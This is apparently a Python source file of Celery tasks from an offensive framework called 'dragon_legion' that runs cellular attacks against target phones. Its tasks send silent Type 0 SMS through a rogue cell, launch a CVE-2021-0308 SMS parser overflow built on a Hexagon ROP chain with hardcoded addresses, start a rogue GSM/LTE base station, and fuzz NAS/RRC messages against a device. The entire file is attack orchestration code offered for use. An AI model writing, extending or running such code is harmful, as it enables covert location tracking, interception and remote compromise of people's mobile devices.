"""Celery tasks for cellular baseband attack modules."""

from celery import shared_task
from celery.utils.log import get_task_logger

logger = get_task_logger(__name__)


@shared_task(bind=True, max_retries=2)
def execute_silent_sms(self, attack_id: str, device_id: str,
                       attack_vector: str, params: dict) -> dict:
    """Send a Silent SMS (Type 0) to a target device via rogue cell."""
    logger.info("Sending silent SMS to device %s", device_id)
    from dragon_legion.modules.cellular import build_silent_type0_sms

    tpdu = build_silent_type0_sms()
    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "cellular_silent_sms",
        "tpdu": tpdu.hex(),
    }


@shared_task(bind=True, max_retries=2)
def execute_sms_overflow(self, attack_id: str, device_id: str,
                         attack_vector: str, params: dict) -> dict:
    """Execute CVE-2021-0308 SMS parser overflow with Hexagon ROP chain."""
    logger.info("Executing SMS overflow (CVE-2021-0308) on device %s", device_id)
    from dragon_legion.modules.cellular import (
        build_exploit_sms_tpdu, build_hexagon_rop_chain,
    )

    rop_chain = build_hexagon_rop_chain(
        dma_alloc_addr=0xD4100000,
        memcpy_addr=0xD4200000,
        shellcode_addr=0x00000000,
    )
    tpdu = build_exploit_sms_tpdu(rop_chain)
    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "cellular_sms_overflow",
        "tpdu_length": len(tpdu),
    }


@shared_task(bind=True, max_retries=3)
def execute_rogue_cell(self, attack_id: str, device_id: str,
                       attack_vector: str, params: dict) -> dict:
    """Start a rogue GSM/LTE cell via CellLink BTS or srsRAN integration."""
    logger.info("Starting rogue cell for device %s", device_id)
    from dragon_legion.core.celllink_bridge import CellLinkOrchestrator

    orch = CellLinkOrchestrator()
    orch.connect()

    arfcn = params.get("arfcn", 10)
    band = params.get("band", 0)
    tower = orch.start_tower(arfcn=arfcn, band=band)

    orch.disconnect()

    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "cellular_rogue_cell",
        "arfcn": arfcn,
        "band": band,
    }


@shared_task(bind=True, max_retries=1)
def execute_nas_fuzz(self, attack_id: str, device_id: str,
                     attack_vector: str, params: dict) -> dict:
    """Run NAS/RRC message fuzzing campaign."""
    logger.info("Starting NAS fuzzing on device %s", device_id)
    from dragon_legion.modules.cellular import CellFuzzer

    fuzzer = CellFuzzer()
    results = fuzzer.fuzz_field_lengths(
        params.get("message_type", "rrcConnectionSetup"),
        params.get("field", "maxCells"),
    )
    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "cellular_nas_fuzz",
        "crashes": len(fuzzer.crashes),
    }
